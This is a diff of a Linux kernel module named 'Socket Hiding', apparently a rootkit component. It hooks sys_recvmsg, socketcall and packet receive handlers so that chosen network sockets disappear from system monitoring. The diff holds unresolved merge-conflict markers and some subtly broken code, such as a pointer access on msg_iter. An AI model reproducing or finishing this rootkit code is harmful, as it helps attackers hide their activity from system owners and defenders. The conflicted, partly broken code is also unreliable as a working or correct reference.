@@ -55,7 +55,11 @@ int (*real_packet_rcv)( struct sk_buff*,
                         struct net_device*,
                         struct packet_type*,
                         struct net_device* );
+<<<<<<< HEAD
 
+=======
+asmlinkage long (*real_sys_recvmsg)(int, struct msghdr*, unsigned) = (void*) SM_sys_recvmsg;
+>>>>>>> f0c7ff53298ec49892b288c547176b9a21bd0afb
 void** tcp_hook_fn_ptr;
 void** udp_hook_fn_ptr;
 
@@ -212,7 +216,11 @@ struct proc_dir_entry* get_pde_subdir(struct proc_dir_entry* pde, const char* na
 asmlinkage long fake_recvmsg(int fd, struct msghdr __user *umsg, unsigned flags)
 {
     // Call the real function
+<<<<<<< HEAD
     long ret = SM_sys_recvmsg(fd, umsg, flags);
+=======
+    long ret = real_sys_recvmsg(fd, umsg, flags);
+>>>>>>> f0c7ff53298ec49892b288c547176b9a21bd0afb
 
     // Check if the file is really a socket and get it
     int err = 0;
@@ -229,7 +237,7 @@ asmlinkage long fake_recvmsg(int fd, struct msghdr __user *umsg, unsigned flags)
         // Copy data from user space to kernel space
         struct msghdr* msg = kmalloc(ret, GFP_KERNEL);
         int err = copy_from_user(msg, umsg, ret);
-        struct nlmsghdr* hdr = msg->msg_iov->iov_base;
+        struct nlmsghdr* hdr = msg->msg_iter->iov_base;
         if (err) {
             return ret; // panic
         }
@@ -278,10 +286,10 @@ asmlinkage long fake_socketcall(int call, unsigned long __user *args)
 
 
 int init_module(void){
-    struct kobject* mod_kobj = &(((struct module *)(THIS_MODULE))->mkobj).kobj;
+    struct kobject *mod_kobj = &(((struct module *)(THIS_MODULE))->mkobj).kobj;
 
     printk(KERN_INFO "Socket Hiding loaded.\n");
-    struct net* net_ns;
+    struct net *net_ns;
 
     if (socket_hiding_state == SOCKET_STATE_HIDDEN) {
         return 0;
